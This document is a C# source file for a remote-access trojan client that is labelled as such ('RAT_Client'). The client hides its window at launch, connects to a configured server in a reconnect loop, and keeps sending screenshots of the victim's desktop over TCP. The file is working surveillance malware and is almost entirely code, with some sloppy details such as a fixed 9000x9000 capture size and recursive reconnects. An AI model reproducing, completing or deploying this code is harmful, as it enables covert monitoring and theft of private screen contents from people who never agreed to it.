using System;
using System.Drawing;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;

namespace RAT_Client
{
    public partial class Client : Form
    {
        private TcpClient client = new TcpClient();
        private NetworkStream mainStream;
        private static int portNumber = 57777;
        private static string serverip = "loopback";
        bool connected = false;
        bool send = true;


        private static Image GrabDesktop()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);
            Graphics graphic = Graphics.FromImage(screenshot);
            graphic.CopyFromScreen(0, 0, 0, 0, new Size(9000, 9000),CopyPixelOperation.SourceInvert);
            return screenshot;
        }

        private void SendDesktopImage()
        {
            try
            {
                BinaryFormatter binaryFormatterv = new BinaryFormatter();
                mainStream = client.GetStream();
                binaryFormatterv.Serialize(mainStream, GrabDesktop());
            }
            catch
            {
                connected = false;
                send = false;

                Thread.Sleep(2000);  //vergewalitgung der SendDesktopImage mehtode verhindern
                //MessageBox.Show("Connection lost!");


               

                try
                {
                    client.Close();
                }
                 catch(Exception e)
                {
                    MessageBox.Show(e.ToString());
                }

                send = true;
                start();
            }

        }

        private void start()
        {
            do
            { 
                do
                    try
                    {
                        client.Connect(serverip, portNumber);
                        connected = true;
                    }
                    catch (Exception ex)
                    {
                    }
                while (!connected);


                try
                {
                    SendDesktopImage();
                }
                catch
                {
                    connected = false;
                    start();
                }

            } while (send);

        }


        public Client()
        {
            InitializeComponent();
            this.Hide();
            send = true;
            start();

        }
    }
}
